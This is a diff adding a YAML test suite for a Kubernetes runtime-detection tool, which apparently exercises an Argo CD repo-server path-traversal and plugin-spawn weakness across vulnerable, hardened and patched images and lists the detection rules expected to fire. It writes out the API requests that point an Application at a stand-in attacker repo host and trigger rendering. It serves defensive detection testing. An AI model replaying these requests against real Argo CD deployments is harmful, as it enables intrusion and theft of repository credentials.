@@ -1,0 +1,81 @@
+apiVersion: bobctl.k8sstormcenter.io/v1alpha1
+kind: AttackSuite
+metadata:
+  name: argocd-three-scenarios
+  description: |
+    ONE malicious-repo payload, THREE scenarios — the active-diagnosis
+    discriminator for the Argo CD repo-server manifest-generation
+    weakness (CVE-2022-24348 class, path traversal + plugin process
+    spawn during render).
+
+    Same Application + same attacker repo in every scenario:
+      an Application whose source points at adv/attacker's repo, which
+      ships a Helm chart + config-management plugin crafted to make the
+      repo-server (a) read a file outside the per-repo working dir and
+      (b) spawn a helper process during render.
+
+    Same topology (argocd/app repo-server <- attacker repo in adv ns).
+    What differs is the argocd/app container image only:
+      A = vulnerable Argo CD, default repo-server (shell + helm + kustomize present)
+      B = contained repo-server (distroless, seccomp, read-only fs, no /bin/sh)
+      C = patched Argo CD (traversal closed, plugin sandboxed)
+
+    Detection narrative (with the repo-server ApplicationProfile baseline
+    learned from argocd-benign-baseline):
+      A: R0001 (new comm under argocd-repo-server: the spawned helper not
+         in the AP execs list), R0010 (read of a file outside the repo
+         working dir / argocd repo credentials), R0011 (egress to the
+         attacker repo host, which is not in the NN).
+      B: R0011 (initial fetch to the attacker repo), then R1100 (the
+         render-time helper process can't start: no /bin/sh -> ENOENT —
+         the contained-at-exec signature).
+      C: nothing — the patched render rejects the traversal and the
+         plugin sandbox blocks the spawn. The malicious repo is fetched
+         and rendered inertly. Negative control.
+
+    Re-deploy argocd/app between scenarios (apply app-b.yaml / app-c.yaml,
+    then restart). The AttackSuite itself is identical across all three.
+
+target:
+  service: argocd-server
+  namespace: argocd
+  port: 8080
+  protocol: https
+
+attacks:
+  - name: register-attacker-repo
+    description: point an Application at the attacker-hosted repo
+    request:
+      method: POST
+      path: /api/v1/applications
+      body: |
+        {"metadata":{"name":"probe-app"},
+         "spec":{"source":{"repoURL":"http://attacker.adv.svc.cluster.local/repo.git",
+                           "path":".","targetRevision":"HEAD"},
+                 "destination":{"server":"https://kubernetes.default.svc","namespace":"argocd"}}}
+    expect: { status: 200 }
+
+  - name: trigger-render
+    description: |
+      sync the probe Application — this drives the repo-server to fetch
+      and render the attacker repo, triggering the traversal + helper
+      spawn. The kernel-observable signal is produced HERE.
+    request:
+      method: POST
+      path: /api/v1/applications/probe-app/sync
+      body: "{}"
+    expect: { status: 200 }
+
+expectedDetections:
+  - ruleID: R0001
+    containerName: repo-server
+    description: new process under argocd-repo-server (render-time helper)
+  - ruleID: R0010
+    containerName: repo-server
+    description: read of a file outside the per-repo working directory
+  - ruleID: R0011
+    containerName: repo-server
+    description: egress to the attacker repo host (not in NN)
+  # R1100 (scenario B) is asserted only when the contained image is
+  # deployed AND the R1100 rule is present in node-agent (upstream
+  # dependency — see docs/portability-spec.md D3).
